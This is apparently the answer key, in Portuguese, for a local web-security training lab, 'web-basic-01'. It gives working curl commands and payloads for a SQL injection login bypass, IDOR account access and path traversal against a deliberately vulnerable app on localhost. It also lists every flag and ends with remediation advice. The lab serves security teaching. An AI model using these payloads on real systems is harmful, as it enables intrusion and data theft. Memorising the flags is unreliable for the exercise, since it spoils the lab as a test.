# Solution - web-basic-01

Gabarito tecnico do lab **web-basic-01**.

Escopo autorizado:

```text
http://localhost:8080
```

## 1. Subir e validar

```bash
cd web-basic-01
docker compose up --build
```

Validar:

```bash
curl -i http://localhost:8080
curl -i http://localhost:8080/health
```

O `/health` revela `MiniBank Internal Portal`, versao `1.4.2-dev`, ambiente `development`, path `/usr/src/app` e banco interno `mysql://minibank-db:3306/minibank`.

## 2. Enumeracao

```bash
curl -s http://localhost:8080 | head
curl -s http://localhost:8080 | grep -i "<!--"
curl -i http://localhost:8080/robots.txt
```

Comentario HTML:

```html
<!-- legacy admin panel moved to /admin, check robots.txt before release -->
```

Rotas em `robots.txt`:

- `/admin`
- `/backup`
- `/dev-notes.txt`
- `/download`

## 3. Credencial vazada em arquivo publico

```bash
curl -i http://localhost:8080/dev-notes.txt
```

Credencial encontrada:

```text
backup_user:backup123
```

Flag:

```text
FLAG{exposed_dev_credentials}
```

Validar impacto da credencial:

```bash
curl -i http://localhost:8080/backup
curl -i -u backup_user:backup123 http://localhost:8080/backup
```

Sem credencial deve retornar `401`. Com credencial deve retornar `200 OK`.

## 4. SQL Injection no login

Payload funcional:

```text
username=admin' #
password=qualquercoisa
```

Com `curl`:

```bash
curl -i -c admin.cookies \
  --data-urlencode "username=admin' #" \
  --data-urlencode "password=qualquercoisa" \
  http://localhost:8080/login
```

Validar dashboard:

```bash
curl -s -b admin.cookies http://localhost:8080/dashboard | grep -i "FLAG"
```

Flag:

```text
FLAG{sqli_login_bypass}
```

Motivo tecnico: a rota `POST /login` concatena `username` e `password` diretamente no SQL. O `#` comenta o restante da query MySQL e ignora a verificacao de senha.

## 5. IDOR em contas

Login como Joao:

```bash
curl -i -c joao.cookies \
  -d "username=joao&password=joao123" \
  http://localhost:8080/login
```

Conta propria:

```bash
curl -s -b joao.cookies http://localhost:8080/account/1
```

Conta de outro usuario:

```bash
curl -s -b joao.cookies http://localhost:8080/account/2
```

Flag:

```text
FLAG{idor_account_access}
```

Motivo tecnico: `/account/:id` exige sessao, mas busca conta apenas por `id`, sem validar `user_id` do usuario logado.

## 6. Path Traversal / LFI controlado

Arquivo permitido:

```bash
curl -i "http://localhost:8080/download?file=public-info.txt"
```

Traversal ate o arquivo de flag:

```bash
curl -i "http://localhost:8080/download?file=../../../../flags/final.txt"
```

Flag:

```text
FLAG{path_traversal_file_read}
```

Motivo tecnico: `/download?file=` usa `path.join(filesDir, requestedFile)` e le o resultado sem validar se o caminho final ainda esta dentro de `/usr/src/app/files`.

## 7. Flags finais

- `FLAG{sqli_login_bypass}`
- `FLAG{idor_account_access}`
- `FLAG{exposed_dev_credentials}`
- `FLAG{path_traversal_file_read}`

Nao ha flag propria em `/admin`, `/backup`, `/health`, `robots.txt` ou comentario HTML.

## 8. Recomendacoes de correcao

- SQL Injection: usar prepared statements, parametros e hash forte de senha.
- IDOR: validar autorizacao por recurso, incluindo `user_id` na consulta ou regra equivalente.
- Credencial vazada: remover segredo de `public`, rotacionar credencial e usar secret manager/variaveis de ambiente.
- Path Traversal: usar allowlist, normalizar caminho e garantir que o path final permanece no diretorio permitido.
- Healthcheck: retornar somente status minimo para acesso externo.
- Comentarios/robots: remover pistas operacionais do HTML e nao usar `robots.txt` como protecao.

